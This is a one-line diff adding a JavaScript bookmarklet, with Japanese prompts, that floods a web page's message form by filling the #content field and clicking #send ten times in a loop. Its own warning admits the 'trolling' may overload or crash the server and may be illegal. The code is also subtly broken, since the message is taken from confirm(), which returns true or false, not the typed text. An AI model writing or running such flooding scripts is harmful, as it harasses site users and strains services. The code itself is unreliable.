@@ -1,0 +1,1 @@
+javascript:if(prompt("荒らしをする前に、\nサーバーに負荷がかかりサーバーがダウンすることがあります。サーバーをダウンさせることは、住んでる地域によっては法律に引っかかる可能性があります。\n実行しますか？")) {for (let i = 0; i < 10; i++) {document.querySelector("#content").value = confirm("荒らしメッセージを指定してください。");document.querySelector("#send").click();};}
